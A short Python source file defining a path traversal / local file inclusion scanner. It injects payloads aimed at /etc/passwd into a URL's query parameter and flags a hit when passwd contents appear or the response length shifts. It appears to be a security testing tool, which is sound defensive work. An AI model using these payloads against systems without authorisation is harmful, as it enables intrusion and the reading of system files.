import requests
import re

class PathTraversalScanner:
    def __init__(self, url):
        self.url = url
        self.payloads = [
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd"
        ]

    def scan(self):
        findings = []

        if "?" not in self.url or "=" not in self.url:
            return findings

        param = self.url.split("?")[1].split("=")[0]
        base_url = self.url.split("=")[0] + "="

        try:
            baseline = requests.get(self.url, timeout=5).text
        except:
            baseline = ""

        for payload in self.payloads:
            try:
                target = base_url + payload
                response = requests.get(target, timeout=5, allow_redirects=False)

                # Strong confirmation
                if "root:x:0:0" in response.text or "bin/bash" in response.text:
                    findings.append({
                        "url": self.url,
                        "parameter": param,
                        "payload": payload,
                        "severity": "High",
                        "description": "Confirmed Local File Inclusion (LFI) vulnerability."
                    })
                    print(f"  [!] CONFIRMED LFI: {target}")
                    break

                # Heuristic detection (content length change)
                elif abs(len(response.text) - len(baseline)) > 500:
                    findings.append({
                        "url": self.url,
                        "parameter": param,
                        "payload": payload,
                        "severity": "Medium",
                        "description": "Potential Path Traversal behavior detected (response deviation)."
                    })
                    print(f"  [!] POTENTIAL Path Traversal behavior: {target}")

            except Exception as e:
                continue

        return findings
